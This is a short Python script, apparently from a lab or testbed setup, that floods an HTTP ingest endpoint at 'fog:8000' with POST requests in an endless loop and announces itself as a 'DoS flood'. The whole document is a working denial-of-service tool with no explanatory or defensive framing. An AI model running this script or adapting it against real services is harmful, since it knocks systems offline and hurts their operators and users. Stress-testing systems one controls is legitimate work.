import requests, time
FOG = 'http://fog:8000/ingest'
payload = {'name':'dos','payload':'x'*100}
count=0; print('Starting DoS flood (Ctrl-C to stop)')
while True:
    try:
        r = requests.post(FOG, json=payload, timeout=2)
        count+=1
        if count%100==0: print('Requests sent:',count,'last status',r.status_code)
    except Exception as e:
        print('Exception:', e)
    time.sleep(0.01)
